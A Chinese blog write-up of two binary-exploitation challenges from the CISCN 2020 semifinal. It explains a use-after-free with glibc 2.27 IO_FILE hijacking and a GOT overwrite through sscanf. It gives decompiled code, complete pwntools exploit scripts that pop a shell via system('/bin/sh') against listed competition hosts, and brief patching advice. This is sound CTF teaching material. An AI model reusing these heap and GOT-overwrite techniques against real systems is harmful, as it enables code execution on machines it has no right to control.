---
layout: _drafts
title: ciscn2020_half
date: 2020-09-22 00:39:17
tags: ciscn2020
---

# 2020年大学生信息安全竞赛华北赛区半决赛部分pwn题

## 前言

比赛的第一天在钓鱼，题目基本都是胡哥做的修的，挑两个印象比较深的记一下。

## Day1-sentencebox

### 程序逻辑 && 漏洞利用

菜单题，new/edit/show/delete，其中delete有UAF，输入有check，只能部分字符可以输入，但是注意是先read再做检测，因此我们有一次输入非法字符的机会，之后就exit了，这题当时做的时候想了两种方法，一种是exit退出时候调用的那个函数指针，不过看了下爆破的次数需要的比较多，因此主要做了第二种思路，就是glibc 2.27下的IO_FILE利用。今天看了下东秦的师傅是第一种思路做的，可以参考[neuqcsa](https://github.com/neuqcsa/ciscn2020wp/tree/master)。这里利用ub留下的libc地址，部分写低两个字节到_IO_list_all，改其值为_IO_list_all+8，而后布置fake_io，io的关键check是_flags & 1 != 0以及 _IO_USER_BUF != 0，构造的话,fp+0xe8为system函数地址，fp+0x38为binsh字符串地址，fp+0xd8 = _IO_str_jumps-8。

另外stdout不能改，否则puts会出问题，stderr不能改，因为其fp+0xe8对应到stdout->read_ptr，在puts的时候会被更新，stdin也无法改，因为两个字节改不到

```c
__int64 __fastcall Check(_BYTE *a1, int a2)
{
  __int64 result; // rax
  unsigned int v3; // [rsp+10h] [rbp-10h]
  int v4; // [rsp+14h] [rbp-Ch]
  _BYTE *v5; // [rsp+18h] [rbp-8h]

  v5 = a1;
  v4 = read(0, a1, a2);
  if ( v4 <= 0 )
    exit(1);
  v3 = 0;
  while ( 1 )
  {
    result = v3;
    if ( (signed int)v3 >= v4 )
      break;
    if ( (*v5 <= 0x60 || *v5 > 0x7A)
      && (*v5 <= 0x40 || *v5 > 0x5A)
      && *v5 != 0xA
      && *v5 != 0x20
      && *v5 != 0x27
      && *v5 != 0x21
      && *v5 != 0x3F
      && *v5 != 0x2E
      && *v5 != 0x2C )
    {
      puts("dangerous char found! sentences only!");
      exit(1);
    }
    ++v3;
    ++v5;
  }
  return result;
}
```

### exp.py

概率大概1/16。

```py
#coding=utf-8
from pwn import *
debug = 1
context.terminal = ['tmux','split','-h']
context.log_level = "info"
se      = lambda data           :p.send(data)
sa      = lambda delim,data     :p.sendafter(delim, data)
sl      = lambda data           :p.sendline(data)
sla     = lambda delim,data     :p.sendlineafter(delim, data)
sea     = lambda delim,data     :p.sendafter(delim, data)
rc      = lambda numb=4096      :p.recv(numb)
rl      = lambda                :p.recvline()
ru      = lambda delims         :p.recvuntil(delims)
uu32    = lambda data           :u32(data.ljust(4, '\x00'))
uu64    = lambda data           :u64(data.ljust(8, '\x00'))
itv     = lambda                :p.interactive()


# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
libc_base = 0
if debug:
    p = process("./sentencebox")
# p = process('./feedback',env={'LD_PRELOAD':'./libc-2.23.so'})
    elf = ELF("./sentencebox")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
    p = remote("124.70.197.50",9010)
    elf = ELF("./sentencebox")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

def create(index,size,content):
    sla("> ","1")
    sla("idx: \n",str(index))
    sla("size: \n",str(size))
    sa("data: \n",content)

def edit(index,content):
    sla("> ","2")
    sla("idx: \n",str(index))
    sa("data: \n",content)

def show(index):
    sla("> ","3")
    sla("idx: \n",str(index))


def delete(index):
    sla("> ","4")
    sla("idx: \n",str(index))

def exp():

    for i in range(8):
        create(i,0xff,"a")

    for i in range(1,7):
        delete(i)
    delete(0)
    delete(0)

    show(0)
    p.recv(6)

    libc.address = u64(p.recv(6).ljust(8,"\x00"))+0x7ffff79e4000-0x7ffff7dcfca0
    libc_base = libc.address
    success("libc ==> "+hex(libc.address))
    stdout = libc.sym['_IO_2_1_stdout_']
    return stdout

while True:
    p = process("./sentencebox")
    stdout = exp()
    libc_base = libc.address
    if stdout & 0xffff != 0x6760:
        p.close()
        continue
    edit(0,"\x5a\x66")
    static_libc = 0x7ffff79e4000

    create(8,0xff,"a")
    payload = '\x00'*6+p64(libc_base+0x3ec668)+p64(0xfbad1800)+p64(0x00007ffff7dd07e3-static_libc+libc_base)*4+p64(0x00007ffff7dd07e4-static_libc+libc_base)+p64(0x00007ffff7dd07e3-static_libc+libc_base)+p64(libc.search("/bin/sh\x00").next())+p64(0x00007ffff7dd07e4-static_libc+libc_base)
    payload+= p64(0)*4+p64(0x00007ffff7dcfa00-static_libc+libc_base)+p64(0x0000000000000001)
    payload+= p64(0xffffffffffffffff)+p64(0x000000000a000000)+p64(0x00007ffff7dd18c0-static_libc+libc_base)
    payload+= p64(0xffffffffffffffff)+p64(0)+p64(0x00007ffff7dcf8c0-static_libc+libc_base)+p64(0x0000000000000000)*6
    payload+= p64(libc_base+(0x7f29c5102360-0x7f29c4d1a000)-0x8)+p64(0x00007ffff7dd0680-static_libc+libc_base)+p64(libc.sym['system'])

    gdb.attach(p,'b * 0x400964')
    create(9,0xff,payload) # write stdout ,open /proc/sys/kernel/randomize_va_space
    # gdb.attach(p)
    p.interactive()


```



## Day2-calculator

### 程序逻辑 && 漏洞利用

这题是新华三杯的原题pwn2，程序的开始有个隐蔽的溢出，输入sz=0即可溢出写ptr，利用sscanf可以修改got表，这里改free@got=printf@plt泄露libc，atoi@got改为system，在输入size时get shell。

```c
signed __int64 main_func()
{
  signed __int64 result; // rax
  _DWORD *v1; // rax
  _DWORD *v2; // rax
  _DWORD *v3; // rax
  _DWORD *v4; // rax
  _DWORD *v5; // rax
  _DWORD *v6; // rax
  _DWORD *v7; // rax
  _DWORD *v8; // rax
  _DWORD *v9; // rax
  _DWORD *v10; // rax
  _DWORD *v11; // rax
  _DWORD *v12; // rax
  _DWORD *v13; // rax
  _DWORD *v14; // rax
  _DWORD *v15; // rax
  _DWORD *v16; // rax
  _DWORD *v17; // rax
  _DWORD *v18; // rax
  _DWORD *v19; // rax
  _DWORD *v20; // rax
  int v21; // eax
  char signle_byte; // [rsp+Fh] [rbp-51h]
  int v23; // [rsp+10h] [rbp-50h]
  int idx; // [rsp+14h] [rbp-4Ch]
  unsigned int i; // [rsp+18h] [rbp-48h]
  unsigned int j; // [rsp+1Ch] [rbp-44h]
  char v27[56]; // [rsp+20h] [rbp-40h]
  unsigned __int64 v28; // [rsp+58h] [rbp-8h]

  v28 = __readfsqword(0x28u);
  idx = 0;
  ptr = malloc(0x100uLL);
  bss_ptr2 = malloc(0x200uLL);
  puts("Input the size:");
  global_sz = read_int();
  if ( (unsigned int)global_sz > 0x30 )
  {
    puts("The formula is too long!");
    free(ptr);
    free(bss_ptr2);
    result = 1LL;
  }
  else
  {
    memset(bss_input_data, 0, 0x30uLL);
    puts("Input the formula:");
    for ( i = 0; i <= global_sz - 1; ++i )
    {
      read(0, (char *)&global_sz + i + 4, 1uLL);
      if ( bss_input_data[i] == '\n' )
      {
        bss_input_data[i] = 0;
        global_sz = i;
        break;
      }
    }
    ptr_1 = (__int64)ptr;
    ptr2_1 = (__int64)bss_ptr2;
    for ( j = 0; j <= global_sz - 1; ++j )
    {
      signle_byte = bss_input_data[j];
      if ( signle_byte > 0x2F && signle_byte <= 0x39 )
      {
        if ( idx > 9 )
        {
          puts("The number is too long!");
          free(ptr);
          free(bss_ptr2);
          return 1LL;
        }
        v21 = idx++;
        v27[v21] = signle_byte;
      }
      else
      {
        if ( !idx )
        {
          printf("Lack the number before %c !\n", (unsigned int)signle_byte);
          free(ptr);
          free(bss_ptr2);
          return 1LL;
        }
        v27[idx] = 0;
        __isoc99_sscanf(v27, "%d", ptr_1);
        ptr_1 += 4LL;
        if ( signle_byte == '+' )
        {
          v1 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v1 = 0x20100;
          v23 = 0;
          __isoc99_sscanf("0", "%c", &v23);
          v2 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v2 = v23 + 0x30000;
          v3 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v3 = 0x40100;
          v4 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v4 = 0x20000;
          v5 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v5 = 0x10100;
          bss_off = (ptr2_1 - (signed __int64)bss_ptr2) >> 2;
        }
        else if ( signle_byte > '+' )
        {
          if ( signle_byte == '-' )
          {
            v6 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v6 = 0x20100;
            v23 = 0;
            __isoc99_sscanf("0", "%c", &v23);
            v7 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v7 = v23 + 0x30000;
            v8 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v8 = 0x50100;
            v9 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v9 = 0x20000;
            v10 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v10 = 0x10100;
            bss_off = (ptr2_1 - (signed __int64)bss_ptr2) >> 2;
          }
          else
          {
            if ( signle_byte != '/' )
            {
LABEL_23:
              printf("Invalid input %c !", (unsigned int)signle_byte);
              free(ptr);
              free(bss_ptr2);
              return 1LL;
            }
            v16 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v16 = 0x20100;
            v23 = 0;
            __isoc99_sscanf("0", "%c", &v23);
            v17 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v17 = v23 + 0x30000;
            v18 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v18 = 0x60100;
            v19 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v19 = 0x20000;
            v20 = (_DWORD *)ptr2_1;
            ptr2_1 += 4LL;
            *v20 = 0x10100;
            bss_off = (ptr2_1 - (signed __int64)bss_ptr2) >> 2;
          }
        }
        else
        {
          if ( signle_byte != '*' )
            goto LABEL_23;
          v11 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v11 = 0x20100;
          v23 = 0;
          __isoc99_sscanf("0", "%c", &v23);
          v12 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v12 = v23 + 0x30000;
          v13 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v13 = 0x70100;
          v14 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v14 = 0x20000;
          v15 = (_DWORD *)ptr2_1;
          ptr2_1 += 4LL;
          *v15 = 0x10100;
          bss_off = (ptr2_1 - (signed __int64)bss_ptr2) >> 2;
        }
        idx = 0;
      }
    }
    if ( idx <= 9 )
    {
      if ( idx )
      {
        v27[idx] = 0;
        __isoc99_sscanf(v27, "%d", ptr_1);
        what();
        printf("%s = %d\n", bss_input_data, (unsigned int)dword_602180);
      }
      else
      {
        puts("Lack the last number!");
      }
      free(ptr);
      free(bss_ptr2);
      result = 1LL;
    }
    else
    {
      puts("The last number is too long!");
      free(ptr);
      free(bss_ptr2);
      result = 1LL;
    }
  }
  return result;
}
```

### exp.py

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./calculator')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./calculator')
else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Add(size,name,call):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil("Please input the size of compary's name")
    p.sendline(str(size))
    p.recvuntil("please input name:")
    p.send(name)
    p.recvuntil("please input compary call:")
    p.send(call)

def Show(index):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil("Please input the index:")
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil("Please input the index:")
    p.sendline(str(index))

def Go(sz,payload):
    p.sendlineafter("Input the size:",str(sz))
    p.sendlineafter("Input the formula:",payload)


def exp():
    #leak heap
    #gdb.attach(p,'b* 0x4014c8')
    payload = str(elf.plt['printf'])+'\x00'
    payload = payload.ljust(0x10,'1')
    payload = payload + "%6$p+%7$p-"
    payload = payload.ljust(0x34,'p')
    payload += p64(elf.got['free'])*2
    payload += p64(0x602124+4+0x10)
    Go(0,payload)
    p.recvuntil("+0x")
    libc_base = int(p.recvuntil('-',drop=True),16) - libc.sym['_IO_2_1_stdout_']
    log.success("libc base => " + hex(libc_base))
    libc.address = libc_base
    payload = str(libc.sym['system']&0xffffffff)+'\x00'
    payload = payload.ljust(0x34,'p')
    payload += p64(elf.got['atoi'])*2
    payload += p64(0x602124+4)
    Go(0,payload)
    p.sendlineafter("Input the size:\n","/bin/sh")

    p.interactive()

exp()

```

## fix

溢出类型的洞直接IDA patch改小size，UAF的洞比较难patch，需要编写hook.c，在eh_frame写入修改代码，手动清空chunk_list[idx]，具体可以看p4nda师傅的博客[CTF线下赛中常用的PWN题patch方法](http://p4nda.top/2018/07/02/patch-in-pwn/)
